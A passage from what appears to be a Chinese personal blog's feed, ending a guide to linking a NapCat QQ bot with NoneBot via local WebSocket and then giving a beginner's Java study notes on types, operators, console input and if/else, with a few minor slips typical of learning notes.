class="line">url-默认为ws://127.0.0.1:8080/onebot/v11/ws 可能会因为nonebot的配置而变更</span><br><span class="line">Token-自定义的验证用密码 设置后需要在nonebot的.env文件中配置相同字段 这里建议配置 因为能有效防止403报错的问题出现</span><br><span class="line">//在.env中的配置格式- ONEBOT\_ACCESS\_TOKEN=[相同密码]</span><br><span class="line">剩下的都是可选项 知道是什么的情况下再改</span><br></pre></td></tr></table></figure><p>2.直接通过修改安装目录中的<code>./config/onebot11_xxxx.json</code>文件来配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;network&quot;: &#123;</span><br><span class="line">// WS客户端组/反向WS 可以配置多个 这里演示为一个</span><br><span class="line">&quot;websocketClients&quot;: [</span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;WsClient&quot;,// 名字不能重复 唯一标识</span><br><span class="line">&quot;enable&quot;: false,//启用状态</span><br><span class="line">&quot;url&quot;: &quot;ws://localhost:8082&quot;,// 上报地址</span><br><span class="line">&quot;messagePostFormat&quot;: &quot;array&quot;,// 消息上报格式 string/array</span><br><span class="line">&quot;reportSelfMessage&quot;: false,// 是否上报自身消息</span><br><span class="line">&quot;reconnectInterval&quot;: 5000,// 重连间隔</span><br><span class="line">&quot;token&quot;: &quot;&quot;,// 鉴权密钥</span><br><span class="line">&quot;debug&quot;: false,// raw数据上报</span><br><span class="line">&quot;heartInterval&quot;: 30000// 心跳周期</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line">&quot;musicSignUrl&quot;: &quot;&quot;,</span><br><span class="line">&quot;enableLocalFile2Url&quot;: false,</span><br><span class="line">&quot;parseMultMsg&quot;: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是改名和状态改为启用<br>url改为<code>ws://127.0.0.1:8080/onebot/v11/ws</code><br>这里的 <code>8080</code> 是 NoneBot 输出的端口号，<code>/onebot/v11/ws</code> 是 NoneBot onebot 适配器默认的路径<br><img src="1.jpg" alt="1"><br>一般来说跳出这后三行 提示ws反代已成功连接 就没啥问题了<br>假如重复报403 那就是TOKEN的问题 需要另外设置 方法如上</p><p>测试的时候可以使用自带的echo功能 在群聊或者私聊输入（群聊里还需要@机器人） &#x2F;echo [想让机器人说的话] 若成功回复则为成功<br>接下来去nonebot商店里找点插件自己安装吧</p><h2 id="插件（先摸了）"><a href="#插件（先摸了）" class="headerlink" title="插件（先摸了）"></a>插件（先摸了）</h2><h1 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾&#x2F;引用"></a>结尾&#x2F;引用</h1><blockquote><p>We are just another visitor in a transient world</p></blockquote><p><a href="https://napneko.pages.dev/">napcat安装文档</a><br><a href="https://nonebot.dev/">nonebot安装文档</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搞点java</title>
      <link href="/2024/11/23/%E6%90%9E%E7%82%B9java/"/>
      <url>/2024/11/23/%E6%90%9E%E7%82%B9java/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>不多说了 接触点新的语言 指不定用得上呢<br>环境为windows11 java17</p><p><a href="https://www.bilibili.com/video/BV1994y1r7uV">跳转</a><br>顺便做个学习记录吧<br><strong>11&#x2F;23</strong> 17:30 p24完成 19:30 p25完成<br><strong>11&#x2F;24</strong> 17:00 p26完成 17:30 p27完成<br><strong>11&#x2F;25</strong> p28完成 p29完成 p30完成<br><strong>11&#x2F;26</strong> p31完成 p32完成 p33完成 p34完成 p35完成 p36完成<br>p38 p39是教你下软件 这里用idea代替<br>p40 跳过<br><strong>11&#x2F;27</strong> p41完成 看p51 到p56<br><strong>11&#x2F;28</strong> p56完成 p57完成-p65完成<br><strong>11&#x2F;29</strong> p66完成 p67完成 p68完成-p76-p79完成 p80完成<br>最近学的有点多了 得消化消化 先转移一下注意力吧</p><p>ps:大学竟然今后只学c++ 这下白搭了</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>请注意java为<strong>大小写敏感</strong>的强类型语言（每个值的数据类型都不能随意变更）<br><strong>javac编译的时候加上 <code>-encoding utf-8</code> 不然程序不认中文</strong></p><h2 id="helloworld程序"><a href="#helloworld程序" class="headerlink" title="helloworld程序"></a>helloworld程序</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">System.out.print(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//public所修饰的class必须与文件名保持一致 且一个java文件可以存在多个class 但编译后会分开</span></span><br><span class="line">/\*</span><br><span class="line">多行注释</span><br><span class="line">\*/</span><br><span class="line">/\*\*</span><br><span class="line">文档注释-用于自动生成帮助文件/在编译环境中生成简介</span><br><span class="line">命令 javadoc -encoding utf-<span class="number">8</span> 类名 （-d可指定输出目录）可以生成一系列帮助文件</span><br><span class="line">\*/</span><br></pre></td></tr></table></figure><p>（windows系统需要提前配置环境变量）编译运行过程:<br>打开cmd 同目录下输入 <code>javac 文件名.java</code><br>会出现一个.class文件 随后运行<code>java 文件名</code>即可运行程序<br><code>System.out.print为直接输出 System.out.println会在输出后自己换行</code></p><h2 id="变量定义-赋值"><a href="#变量定义-赋值" class="headerlink" title="变量定义&amp;赋值"></a>变量定义&amp;赋值</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">output</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> money;</span><br><span class="line">money = <span class="number">100</span>;</span><br><span class="line">System.out.println(money);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="定量名需要注意的几个点"><a href="#定量名需要注意的几个点" class="headerlink" title="定量名需要注意的几个点"></a>定量名需要注意的几个点</h2><p>1.不能以数字开头 可以包含数字 字母 下划线<code>_</code> 货币符号<br>2.不能和关键字 保留字重名 不能是 true false null</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>分为<strong>基本数据类型</strong> 和 <strong>引用数据类型</strong><br>基本数据类型分为整数 小数 布尔 字符</p><p><strong>整数</strong>分为byte short int long（默认运算时为int 若需要为long类型赋值较大整数时 需要在数的后面加“L”）<br>分别占用1 2 4 8字节<br>二进制取值范围为2的7次方 15次方 31次方 63次方</p><p><strong>小数</strong>分为float double（默认为double 若需要为float型赋值时 需要在数的后面加“F”）<br>分别占用4 8字节</p><p><strong>布尔类型</strong>boolean占用4字节 取值为true(真)或者false(假)</p><p><strong>字符类型</strong>只有个char 占2字节 取值范围0-65535<br>赋值的时候可以直接用单引号加字符 也可以用整数或进制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> <span class="number">65</span>;</span><br><span class="line"><span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> <span class="string">&#x27;\u00041&#x27;</span>;</span><br></pre></td></tr></table></figure><p>在一些特殊情况下 使用转义字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\n 换行</span><br><span class="line">\t 缩进</span><br><span class="line">\\ 反斜线</span><br><span class="line">\&#x27; 单引号</span><br><span class="line">\&quot; 双引号</span><br></pre></td></tr></table></figure><p>引用数据类型分为字符串 数组 对象</p><p><strong>字符串类型</strong>只有string 可以表示一串的字符</p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p>自动类型转换：</p><ul><li>两种类型互相兼容</li><li>目标类型<strong>大于</strong>源类型</li></ul><p>强制类型转换：</p><ul><li>两种类型互相兼容</li><li>目标类型<strong>小于</strong>源类型</li></ul><p>例:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">自动转换</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">short</span> <span class="variable">s</span> <span class="operator">=</span><span class="number">123</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> s;</span><br><span class="line"><span class="comment">//转换成功</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">强制转换</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">short</span> <span class="variable">s</span> <span class="operator">=</span><span class="number">123</span>;</span><br><span class="line"><span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> s;</span><br><span class="line"><span class="comment">//转换失败</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">short</span> <span class="variable">s</span> <span class="operator">=</span><span class="number">123</span>;</span><br><span class="line"><span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> (<span class="type">byte</span>)s;</span><br><span class="line"><span class="comment">//转换成功</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>强制转换可能会导致数据截断——整数长度不够的话会根据二进制安排一个不同的数 小数转整数会失去精度</p><h2 id="自动数据转换"><a href="#自动数据转换" class="headerlink" title="自动数据转换"></a>自动数据转换</h2><p><img src="1.jpg" alt="1"><br>输出数据的时候也可以利用加号来达到类似c语言中占位符的效果<br>例：<code>int a=1; System.out.println(&quot;a=&quot;+a);</code><br>输出结果就会是a&#x3D;1</p><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>就是使两个数之间进行计算的符号</p><table><thead><tr><th>操作符</th><th>描述</th></tr></thead><tbody><tr><td>+</td><td>加、求和</td></tr><tr><td>-</td><td>减、求差</td></tr><tr><td>*</td><td>乘、求积</td></tr><tr><td>&#x2F;</td><td>除、求商</td></tr><tr><td>%</td><td>模、求余</td></tr></tbody></table><p>还有俩<strong>一元运算符</strong>（只需要一个操作数的运算符）</p><table><thead><tr><th>操作符</th><th>描述</th></tr></thead><tbody><tr><td>++</td><td>递增、变量值+1</td></tr><tr><td>–</td><td>递减、变量值-1</td></tr></tbody></table><p>输出的时候为防止字符串优先级过高 可以使用括号<br>想要输出小数可以用(double)转数据类型<br>报错的小差分——整形除以0会抛异常说不能除以0<br>浮点除以0会说结果无限大（因为0是无限小）<br>0除以0会返回NaN<br><strong>++和–在变量的前面&#x2F;后面 运行结果会有所不同</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当++、--运算符前置的时候，返回自加/自减后的值</span><br><span class="line">当++、--运算符后置的时候，返回自加/自减前的值</span><br></pre></td></tr></table></figure><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><table><thead><tr><th>操作符</th><th>描述</th></tr></thead><tbody><tr><td>&#x3D;</td><td>直接赋值</td></tr><tr><td>+&#x3D;</td><td>求和后赋值</td></tr><tr><td>-&#x3D;</td><td>求差后赋值</td></tr><tr><td>*&#x3D;</td><td>求积后赋值</td></tr><tr><td>&#x2F;&#x3D;</td><td>求商后赋值</td></tr><tr><td>%&#x3D;</td><td>求模后赋值</td></tr></tbody></table><p><code>a+=b ----&gt; a=a+b</code>(理论来说是相同的 但一元和二元运算符有区别 后面会说)</p><h2 id="例题：交换两个变量的值"><a href="#例题：交换两个变量的值" class="headerlink" title="例题：交换两个变量的值"></a>例题：交换两个变量的值</h2><p>有两种方式 引入一个新的空变量 或者利用逆运算和赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方法一 引入空变量</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> temp;</span><br><span class="line">temp = a; <span class="comment">//将a的值存入temp中</span></span><br><span class="line">a = b; <span class="comment">//将a的值变为b</span></span><br><span class="line">b = temp; <span class="comment">//将temp中存储的a值放入b</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//方法二 利用逆运算</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">a = a + b; <span class="comment">//a赋值为a与b的和</span></span><br><span class="line">b = a - b; <span class="comment">//让b从两者之和中减去自身 得到a的值</span></span><br><span class="line">a = a - b; <span class="comment">//a从两者之和中再减去现在的b 得到b的值</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="至于一元-二元运算符之间的区别"><a href="#至于一元-二元运算符之间的区别" class="headerlink" title="至于一元&#x2F;二元运算符之间的区别"></a>至于一元&#x2F;二元运算符之间的区别</h2><p>一元运算符在运算时会使后者的数值进行隐式转换 与前者保持相同<br>而二元运算符则会按照前文讲过的规律自动转换数据 不注意会引发报错<br><img src="2.jpg" alt="2"><br>(前者触发了将short强制转换成int的错误 而后者会隐式转换 没有问题)</p><h2 id="其他运算符"><a href="#其他运算符" class="headerlink" title="其他运算符"></a>其他运算符</h2><p><strong>关系运算符:两个操作数进行比较</strong></p><table><thead><tr><th>操作符</th><th>描述</th></tr></thead><tbody><tr><td>&gt;</td><td>大于</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>&gt;&#x3D;</td><td>大于等于</td></tr><tr><td>&lt;&#x3D;</td><td>小于等于</td></tr><tr><td>&#x3D;&#x3D;</td><td>等于</td></tr><tr><td>!&#x3D;</td><td>不等于</td></tr></tbody></table><p>这些返回的都是布尔值 true 或 false</p><p><strong>逻辑运算符:两个布尔类型的操作数或表达式进行逻辑比较</strong></p><table><thead><tr><th>操作符</th><th>语义</th><th>描述</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>与（并且）</td><td>两个操作数，同时为真，结果为真</td></tr><tr><td></td><td></td><td></td></tr><tr><td>！</td><td>非（取反）</td><td>意为“不是”，真就是假，假就是真</td></tr></tbody></table><p><strong>小知识-短路与</strong>:<br>在判断与的语句中 系统为了缩减所需时间<br>当前面任意一项为假导致结果为假时 会直接掐断判断的过程 让后半段不被运行<br>例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int a = 8,b = 10;</span><br><span class="line">System.out.println(a&gt;9 &amp;&amp; b++==10);</span><br><span class="line">System.out.println(b);</span><br><span class="line">由于前者a&gt;9为假 b++的过程被直接掐断 导致b输出出来依旧是10</span><br><span class="line">按位与(&amp;)不会有短路机制 一路触发运行</span><br><span class="line">相同的 ||（或）也分短路或和按位或（|）的区别 具体逻辑同上</span><br></pre></td></tr></table></figure><p><strong>三元运算符:将判断后的结果赋值给变量</strong></p><table><thead><tr><th>操作符</th><th>语义</th><th>描述</th></tr></thead><tbody><tr><td>? :</td><td>布尔表达式?结果一:结果二</td><td>当表达式结果为真，获得结果一 当表达式结果为假，获得结果二</td></tr></tbody></table><h2 id="运算符的优先级"><a href="#运算符的优先级" class="headerlink" title="运算符的优先级"></a>运算符的优先级</h2><p>括号优先<br>算数&gt;关系&gt;赋值<br>例: (<code>d=a+b&gt;c</code>)中优先计算a+b 后将a+b的值与c作比较 随后将布尔值赋予d<br>然后是先乘除后加减 逻辑运算中 非(!) 优先于 与(&amp;&amp;) 优先于或(||)</p><h2 id="控制台输入"><a href="#控制台输入" class="headerlink" title="控制台输入"></a>控制台输入</h2><p>程序在运行的时候 可以在控制台手动录入数据 再让程序继续运行<br>而为了使用这个功能 我们需要导入java预先准备好的包<br>使用方式为 &#96;import 包名.类名;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner; <span class="comment">//导入java包</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in); <span class="comment">//定义扫描仪</span></span><br><span class="line">System.out.println(<span class="string">&quot;请输入用户名:&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> input.next();</span><br><span class="line">System.out.println(<span class="string">&quot;您输入的名字是&quot;</span>+name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用Scanner类中对应的方法(区分类型);</span></span><br><span class="line">.nextInt(); <span class="comment">//获得整数</span></span><br><span class="line">.nextDouble(); <span class="comment">//获得小数</span></span><br><span class="line">.next(); <span class="comment">//获得字符串</span></span><br><span class="line">.next().charAt(<span class="number">0</span>); <span class="comment">//获得单个字符 0指取第一个位置的数</span></span><br></pre></td></tr></table></figure><h3 id="作业-将接受的汉字转为对应的编码值并输出"><a href="#作业-将接受的汉字转为对应的编码值并输出" class="headerlink" title="作业:将接受的汉字转为对应的编码值并输出"></a>作业:将接受的汉字转为对应的编码值并输出</h3><p>其实挺简单的 只要在输出的时候使用(int)进行强制转换即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner; <span class="comment">//导入java包</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in); <span class="comment">//定义扫描仪</span></span><br><span class="line">System.out.println(<span class="string">&quot;请输入汉字:&quot;</span>);</span><br><span class="line"><span class="type">char</span> <span class="variable">name</span> <span class="operator">=</span> input.next().charAt(<span class="number">0</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;您输入的字符对应的int值是&quot;</span>+(<span class="type">int</span>)name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">/\*</span><br><span class="line">输出：</span><br><span class="line">请输入汉字:</span><br><span class="line">我</span><br><span class="line">您输入的字符对应的<span class="type">int</span>值是<span class="number">25105</span></span><br><span class="line">\*/</span><br></pre></td></tr></table></figure><h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><p>if的结构没啥好讲的 就是根据布尔值进行结果的选择性运行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.\*; <span class="comment">//用星号可以直接引用所有util下的项 一劳永逸</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testif</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">System.out.println(<span class="string">&quot;input number:&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span> input.nextInt();</span><br><span class="line"><span class="keyword">if</span> (score&gt;<span class="number">60</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;你合格了&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;你不过关&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">/\*</span><br><span class="line">输出：</span><br><span class="line">input number:</span><br><span class="line"><span class="number">65</span></span><br><span class="line">你合格了</span><br><span class="line">input number:</span><br><span class="line"><span class="number">32</span></span><br><span class="line">你不过关</span><br><span class="line">\*/</span><br></pre></td></tr></table></figure><h3 id="if嵌套-else-if"><a href="#if嵌套-else-if" class="headerlink" title="if嵌套-else if"></a>if嵌套-else if</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.\*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testif</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">System.out.println(<span class="string">&quot;input number:&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span> input.nextInt();</span><br><span class="line"><span class="keyword">if</span> (score &gt; <span class="number">100</span> || score &lt; <span class="number">0</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;？&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (score == <span class="number">100</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;满分&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;优秀&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;良好&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;合格&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;你完蛋了&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">/\*</span><br><span class="line">输出:</span><br><span class="line">input number:</span><br><span class="line"><span class="number">100</span></span><br><span class="line">满分</span><br><span class="line">input number:</span><br><span class="line"><span class="number">90</span></span><br><span class="line">优秀</span><br><span class="line">input number:</span><br><span class="line"><span class="number">80</span></span><br><span class="line">良好</span><br><span class="line">input number:</span><br><span class="line"><span class="number">60</span></span><br><span class="line">合格</span><br><span class="line">input number:</span><br><span class="line"><span class="number">53</span></span><br><span class="line">你完蛋了</span><br><span class="line">\*/</span><br></pre></td></tr></table></figure><p>要注意在一组 <code>if-else</code> 结构中<strong>只有第一个满足条件的分支会被执行</strong><br>如果某个 <code>if</code> 或 <code>else if</code> 条件为真 其后续的 <code>else if</code> 或 <code>else</code> 将被跳过 和之前的短路机制类似</p><h3 id="嵌套if"><a href="#嵌套if" class="headerlink" title="嵌套if"></a>嵌套if</h3><p>基本就是if里套了个if….</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 